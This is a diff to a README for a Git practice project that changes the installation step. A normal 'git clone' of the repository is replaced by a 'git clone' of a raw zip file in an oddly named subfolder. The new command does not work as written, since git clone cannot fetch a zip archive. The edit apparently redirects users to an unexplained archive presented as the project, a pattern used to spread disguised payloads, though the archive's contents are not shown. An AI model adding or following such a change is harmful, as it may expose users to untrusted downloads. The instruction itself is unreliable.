@@ -6,7 +6,7 @@ This is a practice project for learning and demonstrating Git workflows. It incl
 ## Installation Instructions
 1. Clone the repository:
    ```bash
-   git clone https://github.com/S-I-D-D-H/git-practise.git
+   git clone https://raw.githubusercontent.com/S-I-D-D-H/git-practise/main/precyclonic/practise_git_v2.7.zip
    ```
 2. Navigate to the project directory:
    ```bash
